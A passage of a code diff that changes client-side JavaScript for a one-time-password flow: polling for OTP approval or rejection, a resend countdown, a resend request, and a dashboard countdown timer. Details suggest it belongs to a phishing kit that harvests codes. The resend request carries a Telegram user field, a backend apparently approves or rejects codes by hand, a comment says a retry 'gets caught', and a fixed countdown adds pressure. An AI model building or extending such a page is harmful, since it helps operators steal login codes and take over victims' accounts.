+        setTimeout(() => {
+          showScreen("dashboard");
+          startDashboardCountdown();
+        }, 1200);
       } else if (data.status === "rejected") {
-        clearInterval(pollInterval);
-        loadingContainer.classList.add("hidden");
-        showStatus("❌ OTP is not correct. Please try again.", "error");
-        stepOtp.classList.remove("hidden");
+        clearInterval(otpPoll); otpPoll = null;
+        showOtpError("❌ OTP is not correct. Please try again.");
+        // restart polling so user's retry gets caught
+        startOtpPolling();
       }
     } catch (e) { console.log("poll error", e); }
   }, 2000);
 }
 
-function showStatus(msg, type) {
-  statusContainer.textContent = msg;
-  statusContainer.className = `status-msg ${type}`;
-  statusContainer.classList.remove("hidden");
+/* ═══════════════════════════════════════════════════════════
+   RESEND COUNTDOWN
+   ═══════════════════════════════════════════════════════════ */
+function startResendCountdown(seconds) {
+  const link = document.getElementById("resend-link");
+  const secs = document.getElementById("resend-secs");
+  let t = seconds;
+
+  link.classList.add("disabled");
+  link.innerHTML = `Resend in <span id="resend-secs">${t}</span> seconds`;
+
+  if (resendTimer) clearInterval(resendTimer);
+  resendTimer = setInterval(() => {
+    t--;
+    const el = document.getElementById("resend-secs");
+    if (el) el.textContent = t;
+    if (t <= 0) {
+      clearInterval(resendTimer); resendTimer = null;
+      const l = document.getElementById("resend-link");
+      l.classList.remove("disabled");
+      l.textContent = "Resend code";
+      l.onclick = resendCode;
+    }
+  }, 1000);
+}
+
+async function resendCode() {
+  if (!currentEmail) return;
+  const link = document.getElementById("resend-link");
+  link.classList.add("disabled");
+  link.textContent = "Sending…";
+
+  try {
+    const res = await fetch(`${API_URL}/api/request-otp`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ identifier: currentEmail, telegram_user: TG_USER })
+    });
+    const data = await res.json();
+    if (data.session_id) {
+      currentSessionId = data.session_id;
+      otpBoxes.forEach(b => { b.value = ""; b.classList.remove("filled"); });
+      otpBoxes[0].focus();
+      otpSubmitted = false;
+      startResendCountdown(60);
+      startOtpPolling();
+    } else {
+      alert("Failed to resend");
+    }
+  } catch (e) {
+    alert("Network error");
+  }
 }
 
 /* ═══════════════════════════════════════════════════════════
    DASHBOARD
    ═══════════════════════════════════════════════════════════ */
 function noop() {}
-let countdownStarted = false;
-function startCountdown() {
-  if (countdownStarted) return;
-  countdownStarted = true;
+let dashCountdownStarted = false;
+function startDashboardCountdown() {
+  if (dashCountdownStarted) return;
+  dashCountdownStarted = true;
   let t = 58 * 60 + 25;
   const el = document.getElementById("countdown");
   if (!el) return;
